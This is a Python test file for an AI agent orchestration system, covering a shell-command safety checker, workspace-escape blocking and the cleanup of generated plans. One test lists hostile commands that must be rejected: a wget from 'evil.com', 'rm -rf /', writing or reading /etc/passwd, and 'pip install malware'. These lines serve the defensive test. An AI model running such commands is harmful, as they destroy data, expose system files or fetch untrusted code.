"""Phase 10G AMD/openai_responses_api regression tests.

Covers defects found and fixed during the 2026-05-20 AMD llama.cpp smoke.
"""

from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch
import pytest
import sys

_skip_win = pytest.mark.skipif(
    sys.platform == "win32",
    reason="requires Linux shell tools (bash, mkdir -p, chmod, ls, python3)",
)


# ---------------------------------------------------------------------------
# Fix 1: OpenAIResponsesRuntime.execute_task must accept **kwargs
# ---------------------------------------------------------------------------


class TestOpenAIAdapterKwargs:
    def test_execute_task_accepts_reuse_task_session(self):
        """execute_task must not raise TypeError when called with reuse_task_session."""
        from app.services.agents.providers.openai_adapter import OpenAIResponsesRuntime
        import inspect

        sig = inspect.signature(OpenAIResponsesRuntime.execute_task)
        params = sig.parameters
        assert "kwargs" in params or any(
            p.kind == inspect.Parameter.VAR_KEYWORD for p in params.values()
        ), "execute_task must accept **kwargs to absorb unknown keyword args from orchestration layer"

    def test_execute_task_accepts_diagnostic_kwargs(self):
        """execute_task must accept all known orchestration kwargs without error."""
        from app.services.agents.providers.openai_adapter import OpenAIResponsesRuntime
        import inspect

        sig = inspect.signature(OpenAIResponsesRuntime.execute_task)
        params = sig.parameters
        known_kwargs = ["diagnostic_label", "diagnostic_metadata"]
        for kw in known_kwargs:
            assert kw in params, f"execute_task missing expected kwarg: {kw}"


# ---------------------------------------------------------------------------
# Fix 2: _is_safe_local_shell_command detection
# ---------------------------------------------------------------------------


class TestSafeLocalShellCommandDetection:
    def _fn(self):
        from app.services.orchestration.phases.execution_loop import (
            _is_safe_local_shell_command,
        )

        return _is_safe_local_shell_command

    def test_echo_redirect_is_safe(self):
        fn = self._fn()
        assert fn("echo 'hello world' > README.md")
        assert fn("echo -e '# Title\\n\\nBody' > README.md")
        assert fn("printf '%s\\n' 'line1' > out.txt")

    def test_mkdir_is_safe(self):
        fn = self._fn()
        assert fn("mkdir -p src/components")
        assert fn("mkdir docs")

    def test_touch_is_safe(self):
        fn = self._fn()
        assert fn("touch requirements.txt")

    def test_chmod_executable_bit_is_safe(self):
        fn = self._fn()
        assert fn("chmod +x scripts/smoke_status.py")
        assert fn("chmod 755 scripts/smoke_status.py")

    def test_blocked_commands_not_safe(self):
        fn = self._fn()
        assert not fn("curl https://example.com > file.txt")
        assert not fn("wget http://evil.com/script.sh")
        assert not fn("pip install malware")
        assert not fn("rm -rf /")
        assert not fn("sudo echo 'x' > /etc/passwd")
        assert not fn("echo $(cat /etc/passwd) > out.txt")

    def test_read_only_commands_not_safe(self):
        """Read-only commands should not match — they go via inspection path."""
        fn = self._fn()
        assert not fn("ls -la")
        assert not fn("cat README.md")
        assert not fn("python -c \"import sys; print('hi')\"")

    def test_empty_command_not_safe(self):
        fn = self._fn()
        assert not fn("")
        assert not fn("   ")


# ---------------------------------------------------------------------------
# Fix 2b: _execute_local_shell_commands_step integration
# ---------------------------------------------------------------------------


class TestExecuteLocalShellCommandsStep:
    def test_echo_redirect_creates_file(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["echo 'Hello World' > hello.txt"],
            verification_command=None,
        )
        assert result is not None
        assert result["status"] == "completed"
        assert (tmp_path / "hello.txt").exists()
        assert "hello.txt" in result["files_changed"]

    @_skip_win
    def test_mkdir_creates_dir(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["mkdir -p src/components"],
            verification_command=None,
        )
        assert result is not None
        assert result["status"] == "completed"
        assert (tmp_path / "src" / "components").is_dir()

    def test_returns_none_for_unsafe_command(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["curl https://example.com > out.txt"],
            verification_command=None,
        )
        assert result is None, "unsafe command must return None (fall through to LLM)"

    def test_verification_runs_after_commands(self, tmp_path: Path):
        import sys as _sys
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        py = _sys.executable
        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["echo 'hello' > greet.txt"],
            verification_command=f"{py} -c \"import pathlib,sys; sys.exit(0 if pathlib.Path('greet.txt').exists() else 1)\"",
        )
        assert result is not None
        assert result["status"] == "completed"

    def test_failed_verification_returns_failed(self, tmp_path: Path):
        import sys as _sys
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        py = _sys.executable
        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["mkdir -p mydir"],
            verification_command=f"{py} -c \"import pathlib,sys; sys.exit(0 if pathlib.Path('nonexistent.txt').exists() else 1)\"",
        )
        assert result is not None
        assert result["status"] == "failed"

    def test_workspace_escape_blocked(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["touch ../../escape.txt"],
            verification_command=None,
        )
        assert result is None, "path escape must return None (safety fallback)"

    def test_absolute_redirection_target_blocked(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["echo 'escape' > /tmp/orchestrator-escape.txt"],
            verification_command=None,
        )
        assert result is None, "absolute redirect target must not run locally"

    def test_absolute_touch_target_blocked(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["touch /tmp/orchestrator-escape.txt"],
            verification_command=None,
        )
        assert result is None, "absolute touch target must not run locally"

    def test_windows_absolute_target_blocked(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=[r"echo 'escape' > C:\Users\Public\escape.txt"],
            verification_command=None,
        )
        assert result is None, "Windows absolute target must not run locally"

    @_skip_win
    def test_chmod_marks_script_executable(self, tmp_path: Path):
        import os

        from app.services.orchestration.phases.execution_loop import (
            _execute_local_shell_commands_step,
        )

        script = tmp_path / "scripts" / "smoke_status.py"
        script.parent.mkdir()
        script.write_text("#!/usr/bin/env python\nprint('ok')\n", encoding="utf-8")

        result = _execute_local_shell_commands_step(
            project_dir=tmp_path,
            commands=["chmod +x scripts/smoke_status.py"],
            verification_command=(
                'python -c "import os,sys; '
                "sys.exit(0 if os.access('scripts/smoke_status.py', os.X_OK) else 1)\""
            ),
        )

        assert result is not None
        assert result["status"] == "completed"
        assert os.access(script, os.X_OK)


# ---------------------------------------------------------------------------
# Fix 3: _patch_python_verification_cmd auto-injects 'import sys'
# ---------------------------------------------------------------------------


class TestPatchPythonVerificationCmd:
    def _fn(self):
        from app.services.orchestration.phases.execution_loop import (
            _patch_python_verification_cmd,
        )

        return _patch_python_verification_cmd

    def test_injects_import_sys_when_missing(self):
        fn = self._fn()
        cmd = "python3 -c \"import pathlib; sys.exit(0 if pathlib.Path('utils.py').exists() else 1)\""
        out = fn(cmd)
        assert "import sys" in out

    def test_does_not_duplicate_import_sys(self):
        fn = self._fn()
        cmd = "python3 -c \"import sys; import pathlib; sys.exit(0 if pathlib.Path('f.py').exists() else 1)\""
        out = fn(cmd)
        assert out == cmd

    def test_does_not_duplicate_comma_imported_sys(self):
        fn = self._fn()
        cmd = "python3 -c \"import pathlib,sys; sys.exit(0 if pathlib.Path('f.py').exists() else 1)\""
        out = fn(cmd)
        assert out == cmd

    def test_leaves_non_python_commands_unchanged(self):
        fn = self._fn()
        for cmd in ("ls -la", 'node -e "process.exit(0)"', "pytest app/tests"):
            assert fn(cmd) == cmd

    def test_leaves_python_without_sys_unchanged(self):
        fn = self._fn()
        cmd = "python3 -c \"import pathlib; print(pathlib.Path('f.py').exists())\""
        assert fn(cmd) == cmd

    @_skip_win
    def test_patched_command_actually_runs(self, tmp_path: Path):
        """Patched verification command must execute without NameError."""
        import subprocess

        fn = self._fn()
        cmd = "python3 -c \"import pathlib; sys.exit(0 if pathlib.Path('dummy.txt').exists() else 1)\""
        patched = fn(cmd)
        result = subprocess.run(
            patched,
            shell=True,
            cwd=tmp_path,
            capture_output=True,
            text=True,
        )
        assert result.returncode in (0, 1), f"NameError or crash: {result.stderr}"
        assert "NameError" not in result.stderr

    @_skip_win
    def test_configparser_verification_runs_as_simple_local_check(self, tmp_path: Path):
        from app.services.orchestration.phases.execution_loop import (
            _execute_simple_verification_step,
        )

        (tmp_path / "setup.cfg").write_text(
            "[metadata]\nname = myapp\nversion = 0.1.0\n", encoding="utf-8"
        )
        command = (
            'python -c "import configparser,sys; '
            "config = configparser.ConfigParser(); config.read('setup.cfg'); "
            "sys.exit(0 if config.has_section('metadata') and "
            "config['metadata']['name'] == 'myapp' else 1)\""
        )

        result = _execute_simple_verification_step(
            project_dir=tmp_path,
            commands=[command],
            verification_command=command,
        )

        assert result is not None
        assert result["status"] == "completed"


# ---------------------------------------------------------------------------
# Fix 7: read-only inspection steps do not run brittle generated verification
# ---------------------------------------------------------------------------


class TestReadOnlyInspectionVerification:
    def test_planner_and_validator_share_read_only_inspection_classification(self):
        from app.services.orchestration.planning.planner import PlannerService
        from app.services.orchestration.validation.validator import ValidatorService

        step = {
            "step_number": 1,
            "description": "Inspect the current workspace",
            "commands": ["rg --files"],
            "ops": [{"op": "noop", "note": "diagnostic marker"}],
            "verification": None,
            "expected_files": [],
        }

        assert ValidatorService._step_is_readonly_inspection(step) is True
        assert PlannerService._step_is_readonly_inspection(step) is True

    @_skip_win
    def test_read_only_inspection_marks_declared_verification_skippable(
        self, tmp_path: Path
    ):
        from app.services.orchestration.phases.execution_loop import (
            _execute_read_only_inspection_step,
        )

        (tmp_path / "README.md").write_text(
            "Phase 10G Third Machine: Ready\n", encoding="utf-8"
        )

        result = _execute_read_only_inspection_step(
            project_dir=tmp_path,
            commands=["ls"],
        )

        assert result is not None
        assert result["status"] == "completed"
        assert result["skip_declared_verification"] is True

    def test_assessment_skips_brittle_verification_for_read_only_inspection(
        self, tmp_path: Path
    ):
        from app.services.orchestration.execution.execution_flow import (
            assess_step_execution,
        )
        from app.services.orchestration.types import ValidationVerdict

        step = {
            "step_number": 1,
            "description": "Inspect the current workspace",
            "commands": ["ls"],
            "verification": (
                "python -c \"import os; sys.exit(0 if 'scripts' in "
                "os.listdir('.') and 'smoke_status.py' not in "
                "os.listdir('scripts') else 1)\""
            ),
            "rollback": None,
            "expected_files": [],
        }
        step_result = {
            "status": "completed",
            "output": "$ ls\nREADME.md",
            "verification_output": "",
            "skip_declared_verification": True,
            "files_changed": [],
        }

        with patch(
            "app.services.orchestration.execution.execution_flow.ExecutorService.recent_step_tool_failures",
            return_value=[],
        ), patch(
            "app.services.orchestration.execution.execution_flow.ValidatorService.validate_step_success",
            return_value=ValidationVerdict(
                stage="step_validation",
                status="accepted",
                profile="full_lifecycle",
            ),
        ):
            assessment = assess_step_execution(
                db=MagicMock(),
                session_id=1,
                task_id=1,
                project_dir=tmp_path,
                step=step,
                step_result=step_result,
                step_started_at=datetime.now(timezone.utc),
                validation_profile="full_lifecycle",
            )

        assert assessment.step_status == "success"
        assert assessment.error_message == ""

    def test_assessment_skips_future_expected_files_for_read_only_inspection(
        self, tmp_path: Path
    ):
        from app.services.orchestration.execution.execution_flow import (
            assess_step_execution,
        )
        from app.services.orchestration.types import ValidationVerdict

        step = {
            "step_number": 1,
            "description": "Inspect the current workspace",
            "commands": ["ls"],
            "verification": (
                'python -c "import pathlib,sys; sys.exit(0 if '
                "pathlib.Path('index.html').exists() else 1)\""
            ),
            "rollback": None,
            "expected_files": ["index.html", "css/style.css"],
        }
        step_result = {
            "status": "completed",
            "output": "$ ls\n",
            "verification_output": "",
            "skip_declared_verification": True,
            "files_changed": [],
        }

        with patch(
            "app.services.orchestration.execution.execution_flow.ExecutorService.recent_step_tool_failures",
            return_value=[],
        ), patch(
            "app.services.orchestration.execution.execution_flow.ValidatorService.validate_step_success",
            return_value=ValidationVerdict(
                stage="step_validation",
                status="accepted",
                profile="full_lifecycle",
            ),
        ):
            assessment = assess_step_execution(
                db=MagicMock(),
                session_id=1,
                task_id=1,
                project_dir=tmp_path,
                step=step,
                step_result=step_result,
                step_started_at=datetime.now(timezone.utc),
                validation_profile="full_lifecycle",
            )

        assert assessment.step_status == "success"
        assert assessment.error_message == ""

    def test_sanitizer_does_not_require_future_file_during_inspection(self):
        from app.services.orchestration.planning.planner import PlannerService

        plan = [
            {
                "step_number": 1,
                "description": "Inspect the current workspace",
                "commands": ["ls"],
                "verification": (
                    'python -c "import os,sys; '
                    "sys.exit(0 if os.path.exists('README.md') else 1)\""
                ),
                "rollback": None,
                "expected_files": ["README.md"],
            },
            {
                "step_number": 2,
                "description": "Create README.md",
                "commands": [],
                "verification": None,
                "rollback": "rm -f README.md",
                "expected_files": ["README.md"],
                "ops": [
                    {
                        "op": "write_file",
                        "path": "README.md",
                        "content": "Phase 10G AMD LlamaCpp: Ready\n",
                    }
                ],
            },
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(plan)

        assert sanitized[0]["expected_files"] == []
        assert "README.md" not in sanitized[0]["verification"]
        assert "pathlib.Path('.').exists()" in sanitized[0]["verification"]


# ---------------------------------------------------------------------------
# Fix 8: simple unittest file creation must materialize requested test file
# ---------------------------------------------------------------------------


class TestUnittestPlanMaterialization:
    def test_sanitizer_materializes_unittest_file_from_task_prompt(self):
        from app.services.orchestration.planning.planner import PlannerService

        task_prompt = (
            "Create tests/test_smoke_status.py using unittest. The test must "
            "execute scripts/smoke_status.py and assert stdout equals "
            '"Phase 10G Third Machine: Ready".'
        )
        plan = [
            {
                "step_number": 1,
                "description": "Inspect the current workspace",
                "commands": ["ls"],
                "verification": None,
                "rollback": None,
                "expected_files": [],
            },
            {
                "step_number": 2,
                "description": "Create the tests/test_smoke_status.py file",
                "commands": [
                    'python -c "import os,sys; sys.exit(0 if '
                    "'tests/test_smoke_status.py' in os.listdir('tests') else 1)\""
                ],
                "verification": (
                    'python -c "import os,sys; sys.exit(0 if '
                    "'tests/test_smoke_status.py' in os.listdir('tests') else 1)\""
                ),
                "rollback": "rm -f tests/test_smoke_status.py",
                "expected_files": [],
            },
            {
                "step_number": 3,
                "description": "Run the unittest",
                "commands": ["python -m unittest discover -s tests"],
                "verification": "python -m unittest discover -s tests",
                "rollback": None,
                "expected_files": [],
            },
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(
            plan, task_prompt=task_prompt
        )
        create_step = sanitized[1]

        assert create_step["commands"] == []
        assert create_step["verification"] == "python -m unittest discover -s tests"
        assert create_step["expected_files"] == ["tests/test_smoke_status.py"]
        assert create_step["ops"][0]["op"] == "write_file"
        assert create_step["ops"][0]["path"] == "tests/test_smoke_status.py"
        assert "class SmokeStatusTest" in create_step["ops"][0]["content"]
        assert "scripts/smoke_status.py" in create_step["ops"][0]["content"]
        assert "Phase 10G Third Machine: Ready" in create_step["ops"][0]["content"]

    def test_sanitizer_replaces_python_executable_in_unittest_ops(self):
        from app.services.orchestration.planning.planner import PlannerService

        plan = [
            {
                "step_number": 1,
                "description": "Create the tests/test_smoke_status.py file",
                "commands": [],
                "verification": "python -m unittest tests/test_smoke_status.py",
                "rollback": "rm -f tests/test_smoke_status.py",
                "expected_files": ["tests/test_smoke_status.py"],
                "ops": [
                    {
                        "op": "write_file",
                        "path": "tests/test_smoke_status.py",
                        "content": (
                            "import unittest\n"
                            "import subprocess\n\n"
                            "class TestSmokeStatus(unittest.TestCase):\n"
                            "    def test_status(self):\n"
                            "        result = subprocess.run(['python', 'scripts/smoke_status.py'], capture_output=True, text=True)\n"
                            "        self.assertEqual(result.stdout.strip(), 'Phase 10G Third Machine: Ready')\n"
                        ),
                    }
                ],
            }
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(plan)
        content = sanitized[0]["ops"][0]["content"]

        assert "import sys" in content
        assert "subprocess.run([sys.executable, 'scripts/smoke_status.py']" in content
        assert "['python'," not in content

    def test_sanitizer_normalizes_smoke_unittest_script_path_from_workspace_root(self):
        from app.services.orchestration.planning.planner import PlannerService

        plan = [
            {
                "step_number": 1,
                "description": "Create the tests/test_smoke_status.py file",
                "commands": [],
                "verification": "python -m unittest discover -s tests",
                "rollback": "rm -f tests/test_smoke_status.py",
                "expected_files": ["tests/test_smoke_status.py"],
                "ops": [
                    {
                        "op": "write_file",
                        "path": "tests/test_smoke_status.py",
                        "content": (
                            "import unittest\n"
                            "import subprocess\n\n"
                            "class TestSmokeStatus(unittest.TestCase):\n"
                            "    def test_status_output(self):\n"
                            "        result = subprocess.run(['python', '../scripts/smoke_status.py'], capture_output=True, text=True)\n"
                            "        self.assertEqual(result.stdout.strip(), 'Phase 10G Third Machine: Ready')\n"
                        ),
                    }
                ],
            }
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(plan)
        content = sanitized[0]["ops"][0]["content"]

        assert "../scripts/smoke_status.py" not in content
        assert "scripts/smoke_status.py" in content

    def test_sanitizer_rewrites_boolean_subprocess_sys_exit_verification(self):
        from app.services.orchestration.planning.planner import PlannerService

        plan = [
            {
                "step_number": 1,
                "description": "Run the smoke_status.py file",
                "commands": ["python scripts/smoke_status.py"],
                "verification": (
                    'python -c "import subprocess,sys; '
                    "sys.exit(subprocess.run(['python', 'scripts/smoke_status.py'], "
                    "capture_output=True).stdout.strip() == "
                    "b'Phase 10G Third Machine: Ready')\""
                ),
                "rollback": None,
                "expected_files": [],
            }
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(plan)
        verification = sanitized[0]["verification"]

        assert "sys.executable" in verification
        assert "sys.exit(0 if" in verification
        assert "else 1" in verification
        assert "['python'," not in verification

    def test_sanitizer_turns_directory_existence_precondition_into_mkdir(self):
        from app.services.orchestration.planning.planner import PlannerService

        plan = [
            {
                "step_number": 1,
                "description": "Check if scripts directory exists",
                "commands": [
                    'python -c "import pathlib,sys; '
                    "sys.exit(0 if pathlib.Path('scripts').is_dir() else 1)\""
                ],
                "verification": (
                    'python -c "import pathlib,sys; '
                    "sys.exit(0 if pathlib.Path('scripts').is_dir() else 1)\""
                ),
                "rollback": None,
                "expected_files": ["scripts"],
            },
            {
                "step_number": 2,
                "description": "Create scripts/smoke_status.py",
                "commands": [],
                "verification": (
                    'python -c "import pathlib,sys; '
                    "sys.exit(0 if pathlib.Path('scripts/smoke_status.py').exists() else 1)\""
                ),
                "rollback": "rm -f scripts/smoke_status.py",
                "expected_files": ["scripts/smoke_status.py"],
                "ops": [
                    {
                        "op": "write_file",
                        "path": "scripts/smoke_status.py",
                        "content": "print('Phase 10G Third Machine: Ready')\n",
                    }
                ],
            },
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(plan)

        assert sanitized[0]["commands"] == ["mkdir -p scripts"]
        assert "python -c" in sanitized[0]["verification"]
        assert "pathlib.Path" in sanitized[0]["verification"]
        assert sanitized[0]["expected_files"] == []

    def test_sanitizer_adds_strong_verification_for_mkdir_only_ops(self):
        from app.services.orchestration.planning.planner import PlannerService
        from app.services.orchestration.validation.validator import ValidatorService
        from app.services.orchestration.types import PlanAccepted

        plan = [
            {
                "step_number": 1,
                "description": "Ensure the scripts directory exists",
                "commands": [],
                "verification": None,
                "rollback": None,
                "expected_files": [],
                "ops": [{"op": "mkdir", "path": "scripts"}],
            },
            {
                "step_number": 2,
                "description": "Create scripts/smoke_status.py",
                "commands": [],
                "verification": ("python -m py_compile scripts/smoke_status.py"),
                "rollback": "rm -f scripts/smoke_status.py",
                "expected_files": ["scripts/smoke_status.py"],
                "ops": [
                    {
                        "op": "write_file",
                        "path": "scripts/smoke_status.py",
                        "content": "print('Phase 10G Third Machine: Ready')\n",
                    }
                ],
            },
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(plan)

        assert sanitized[0]["commands"] == ["mkdir -p scripts"]
        assert "python -c" in sanitized[0]["verification"]
        assert "pathlib.Path" in sanitized[0]["verification"]
        outcome = ValidatorService.validate_plan(
            sanitized,
            output_text="",
            task_prompt=(
                "Create scripts/smoke_status.py that prints exactly this line: "
                "Phase 10G Third Machine: Ready."
            ),
            execution_profile="full_lifecycle",
        )
        assert isinstance(outcome, PlanAccepted)

    def test_sanitizer_preserves_phase10g_exact_line_without_extra_period(self):
        from app.services.orchestration.planning.planner import PlannerService

        task_prompt = (
            "Create scripts/smoke_status.py that prints exactly this line: "
            "Phase 10G Third Machine: Ready. Ensure the scripts directory exists."
        )
        plan = [
            {
                "step_number": 1,
                "description": "Create the smoke_status.py script",
                "commands": [],
                "verification": (
                    'python -c "import subprocess,sys; '
                    "sys.exit(0 if subprocess.run('./scripts/smoke_status.py', "
                    "capture_output=True).stdout.decode().strip() == "
                    "'Phase 10G Third Machine: Ready.' else 1)\""
                ),
                "rollback": "rm -f scripts/smoke_status.py",
                "expected_files": ["scripts/smoke_status.py"],
                "ops": [
                    {
                        "op": "write_file",
                        "path": "scripts/smoke_status.py",
                        "content": "print('Phase 10G Third Machine: Ready.')\n",
                    }
                ],
            }
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(
            plan, task_prompt=task_prompt
        )

        content = sanitized[0]["ops"][0]["content"]
        verification = sanitized[0]["verification"]
        assert "Phase 10G Third Machine: Ready." not in content
        assert "Phase 10G Third Machine: Ready." not in verification
        assert "Phase 10G Third Machine: Ready" in content
        assert "Phase 10G Third Machine: Ready" in verification

    def test_sanitizer_rewrites_malformed_smoke_status_grep_verification(self):
        from app.services.orchestration.planning.planner import PlannerService

        task_prompt = (
            "Create scripts/smoke_status.py that prints exactly this line and no "
            'trailing punctuation: "Phase 10G AMD LlamaCpp: Ready".'
        )
        plan = [
            {
                "step_number": 1,
                "description": "Create and implement scripts/smoke_status.py",
                "commands": [],
                "verification": (
                    "python -c 'import subprocess,sys; "
                    'sys.exit(subprocess.call("python scripts/smoke_status.py | '
                    'grep -q "Phase 10G AMD LlamaCpp: Ready"", shell=True))\''
                ),
                "rollback": "rm -f scripts/smoke_status.py",
                "expected_files": ["scripts/smoke_status.py"],
                "ops": [
                    {
                        "op": "write_file",
                        "path": "scripts/smoke_status.py",
                        "content": "print('Phase 10G AMD LlamaCpp: Ready')",
                    }
                ],
            }
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(
            plan, task_prompt=task_prompt
        )

        verification = sanitized[0]["verification"]
        assert "grep -q" not in verification
        assert "shell=True" not in verification
        assert "sys.executable" in verification
        assert "Phase 10G AMD LlamaCpp: Ready" in verification

    def test_sanitizer_rewrites_malformed_smoke_status_pathlib_verification(self):
        from app.services.orchestration.planning.planner import PlannerService

        task_prompt = (
            "Create scripts/smoke_status.py that prints exactly this line and no "
            'trailing punctuation: "Phase 10G AMD LlamaCpp: Ready".'
        )
        plan = [
            {
                "step_number": 1,
                "description": "Create the smoke_status.py script",
                "commands": [],
                "verification": (
                    'python -c "import pathlib,sys; sys.exit(0 if '
                    "'print('Phase 10G AMD LlamaCpp: Ready')' in "
                    "pathlib.Path('scripts/smoke_status.py').read_text() else 1)\""
                ),
                "rollback": "rm -f scripts/smoke_status.py",
                "expected_files": ["scripts/smoke_status.py"],
                "ops": [
                    {
                        "op": "write_file",
                        "path": "scripts/smoke_status.py",
                        "content": "print('Phase 10G AMD LlamaCpp: Ready')",
                    }
                ],
            }
        ]

        sanitized = PlannerService.sanitize_common_plan_issues(
            plan, task_prompt=task_prompt
        )

        verification = sanitized[0]["verification"]
        assert "pathlib.Path" not in verification
        assert "print('Phase 10G AMD LlamaCpp: Ready')" not in verification
        assert "sys.executable" in verification
        assert "Phase 10G AMD LlamaCpp: Ready" in verification

    @_skip_win
    def test_assessment_patches_missing_sys_import_in_verification(
        self, tmp_path: Path
    ):
        from app.services.orchestration.execution.execution_flow import (
            assess_step_execution,
        )
        from app.services.orchestration.types import ValidationVerdict

        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "smoke_status.py").write_text(
            "print('Phase 10G Third Machine: Ready')\n", encoding="utf-8"
        )
        step = {
            "step_number": 1,
            "description": "Verify script output",
            "commands": [],
            "verification": (
                'python -c "import pathlib; '
                "sys.exit(0 if pathlib.Path('scripts/smoke_status.py').exists() else 1)\""
            ),
            "rollback": None,
            "expected_files": ["scripts/smoke_status.py"],
        }

        with patch(
            "app.services.orchestration.execution.execution_flow.ExecutorService.recent_step_tool_failures",
            return_value=[],
        ), patch(
            "app.services.orchestration.execution.execution_flow.ValidatorService.validate_step_success",
            return_value=ValidationVerdict(
                stage="step_validation",
                status="accepted",
                profile="full_lifecycle",
            ),
        ):
            assessment = assess_step_execution(
                db=MagicMock(),
                session_id=1,
                task_id=1,
                project_dir=tmp_path,
                step=step,
                step_result={
                    "status": "completed",
                    "output": "",
                    "files_changed": ["scripts/smoke_status.py"],
                },
                step_started_at=datetime.now(timezone.utc),
                validation_profile="full_lifecycle",
            )

        assert assessment.step_status == "success"
        assert "NameError" not in assessment.verification_output

    def test_module_assert_verification_is_not_hardcoded_as_simple_local_check(
        self, tmp_path: Path
    ):
        from app.services.orchestration.phases.execution_loop import (
            _execute_simple_verification_step,
        )

        (tmp_path / "utils.py").write_text(
            "def multiply(a, b):\n    return a * b\n", encoding="utf-8"
        )
        command = 'python -c "import utils; assert utils.multiply(2, 3) == 6"'

        result = _execute_simple_verification_step(
            project_dir=tmp_path,
            commands=[command],
            verification_command=command,
        )

        assert result is None


# ---------------------------------------------------------------------------
# Fix 4: normalize invalid one-line try/except exception checks
# ---------------------------------------------------------------------------


class TestPythonInlineExceptionAssertionNormalization:
    def test_invalid_try_except_one_liner_rewrites_to_assert_raises(
        self, tmp_path: Path
    ):
        from app.services.orchestration.validation.workspace_guard import (
            normalize_command,
        )

        commands = (
            (
                'python -c "import utils; assert utils.multiply(2, 3) == 6; '
                "try: utils.divide(1, 0); assert False, 'Expected ZeroDivisionError' "
                'except ZeroDivisionError: pass"'
            ),
            (
                'python -c "import utils; assert utils.multiply(2, 3) == 6; '
                "try: utils.divide(1, 0); except ZeroDivisionError: pass "
                'else: assert False"'
            ),
        )

        for command in commands:
            normalized = normalize_command(command, tmp_path)

            assert "unittest.TestCase().assertRaises" in normalized
            assert "try:" not in normalized

    @_skip_win
    def test_normalized_exception_assertion_runs(self, tmp_path: Path):
        import subprocess
        import sys
        from app.services.orchestration.validation.workspace_guard import (
            normalize_command,
        )

        (tmp_path / "utils.py").write_text(
            "\n".join(
                [
                    "def multiply(a, b):",
                    "    return a * b",
                    "",
                    "def divide(a, b):",
                    "    if b == 0:",
                    "        raise ZeroDivisionError('Cannot divide by zero')",
                    "    return a / b",
                ]
            ),
            encoding="utf-8",
        )
        command = (
            'python -c "import utils; assert utils.multiply(2, 3) == 6; '
            "try: utils.divide(1, 0); assert False, 'Expected ZeroDivisionError' "
            'except ZeroDivisionError: pass"'
        )

        normalized = normalize_command(command, tmp_path).replace(
            "python -c", f"{sys.executable} -c", 1
        )
        result = subprocess.run(
            normalized,
            shell=True,
            cwd=tmp_path,
            capture_output=True,
            text=True,
        )

        assert result.returncode == 0, result.stderr


# ---------------------------------------------------------------------------
# Fix 5: normalize create-file replace_in_file plans from llama.cpp
# ---------------------------------------------------------------------------


class TestCreateFileReplaceInFileNormalization:
    def test_missing_file_replace_with_stub_old_becomes_write_file(
        self, tmp_path: Path
    ):
        from app.services.orchestration.validation.workspace_guard import (
            normalize_file_ops,
        )

        for placeholder in ("# Your code here", "# Add your utility functions here"):
            ops = normalize_file_ops(
                [
                    {
                        "op": "replace_in_file",
                        "path": "utils.py",
                        "old": placeholder,
                        "new": "def multiply(a, b):\n    return a * b\n",
                    }
                ],
                tmp_path,
            )

            assert ops == [
                {
                    "op": "write_file",
                    "path": "utils.py",
                    "content": "def multiply(a, b):\n    return a * b\n",
                }
            ]

    def test_existing_file_replace_stays_replace_in_file(self, tmp_path: Path):
        from app.services.orchestration.validation.workspace_guard import (
            normalize_file_ops,
        )

        (tmp_path / "utils.py").write_text("# Your code here\n", encoding="utf-8")
        ops = normalize_file_ops(
            [
                {
                    "op": "replace_in_file",
                    "path": "utils.py",
                    "old": "# Your code here",
                    "new": "def multiply(a, b):\n    return a * b\n",
                }
            ],
            tmp_path,
        )

        assert ops[0]["op"] == "replace_in_file"
        assert ops[0]["old"] == "# Your code here"

    def test_empty_existing_file_replace_with_empty_old_becomes_write_file(
        self, tmp_path: Path
    ):
        from app.services.orchestration.validation.workspace_guard import (
            normalize_file_ops,
        )

        (tmp_path / "utils.py").write_text("", encoding="utf-8")
        ops = normalize_file_ops(
            [
                {
                    "op": "replace_in_file",
                    "path": "utils.py",
                    "old": "",
                    "new": "def multiply(a, b):\n    return a * b\n",
                }
            ],
            tmp_path,
        )

        assert ops[0]["op"] == "write_file"
        assert ops[0]["content"] == "def multiply(a, b):\n    return a * b\n"
